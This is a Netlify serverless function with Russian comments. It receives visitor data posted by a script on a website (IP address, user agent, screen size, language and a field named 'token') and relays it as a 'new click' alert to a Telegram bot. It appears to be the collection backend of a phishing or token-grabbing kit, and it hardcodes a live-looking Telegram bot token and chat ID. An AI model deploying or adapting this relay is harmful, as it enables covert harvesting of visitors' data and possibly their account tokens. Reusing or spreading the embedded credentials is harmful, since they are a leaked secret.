exports.handler = async (event) => {
  // Разрешаем только POST-запросы
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  try {
    // 1. Получаем данные от скрипта на сайте
    const body = JSON.parse(event.body);

    // 2. Формируем красивое сообщение
    const text = `🎯 НОВЫЙ КЛИК!\n\n` +
                 `🌐 IP: ${body.ip}\n` +
                 `📱 Устройство: ${body.ua}\n` +
                 `📺 Экран: ${body.screen}\n` +
                 `🗣 Язык: ${body.lang}\n` +
                 `🔑 Токен: ${body.token}`;

    // 3. ВСТАВЬ СВОИ ДАННЫЕ СЮДА (между кавычками)
    const tgToken = "9263108544:AAGo7K3U6DLLdbQkaTFywaIoCVfpTszM96Y";
    const tgChat = "8413144430";

    // 4. Отправляем в Telegram
    const response = await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: tgChat, 
        text: text 
      })
    });

    // Если Telegram вернул ошибку, выводим её в логи Netlify
    if (!response.ok) {
        const err = await response.text();
        console.error("Ошибка Telegram API:", err);
    }

    // 5. Отвечаем сайту, что всё ок
    return { 
      statusCode: 200, 
      body: JSON.stringify({ status: "success" }) 
    };

  } catch (error) {
    // Выводим ошибку в логи, если что-то пошло не так
    console.error("Ошибка функции:", error);
    return { 
      statusCode: 500, 
      body: JSON.stringify({ error: error.toString() }) 
    };
  }
};
